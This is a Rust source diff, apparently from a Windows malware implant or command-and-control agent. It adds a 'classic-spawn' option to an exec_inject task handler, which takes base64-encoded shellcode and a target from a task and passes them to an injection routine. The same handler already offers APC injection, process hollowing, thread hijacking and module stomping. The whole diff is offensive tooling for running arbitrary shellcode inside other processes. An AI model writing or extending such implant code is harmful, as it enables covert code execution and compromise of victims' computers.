@@ -501,7 +501,7 @@ fn exec_inject(task: &Task) -> TaskOutput {
     #[cfg(target_os = "windows")]
     {
         use crate::inject::{
-            inject_classic, inject_apc, inject_hollow, inject_hijack,
+            inject_classic, inject_apc, inject_classic_spawn, inject_hollow, inject_hijack,
             shellcode_from_b64,
         };
         #[cfg(feature = "inject-stomp")]
@@ -556,6 +556,24 @@ fn exec_inject(task: &Task) -> TaskOutput {
                 match inject_apc(&target, &sc) {
                     Ok(())  => TaskOutput::success(b"injected".to_vec()),
                     Err(e)  => TaskOutput::failure(&format!("inject/apc: {e}")),
+                }
+            }
+            "classic-spawn" => {
+                let target = match v.get("target").and_then(|t| t.as_str()) {
+                    Some(t) => t.to_string(),
+                    None    => return TaskOutput::failure("inject/classic-spawn: missing target"),
+                };
+                let sc_b64 = match v.get("shellcode").and_then(|s| s.as_str()) {
+                    Some(s) => s,
+                    None    => return TaskOutput::failure("inject/classic-spawn: missing shellcode"),
+                };
+                let sc = match shellcode_from_b64(sc_b64) {
+                    Some(s) => s,
+                    None    => return TaskOutput::failure("inject/classic-spawn: invalid base64"),
+                };
+                match inject_classic_spawn(&target, &sc) {
+                    Ok(())  => TaskOutput::success(b"injected".to_vec()),
+                    Err(e)  => TaskOutput::failure(&format!("inject/classic-spawn: {e}")),
                 }
             }
             "hollow" => {
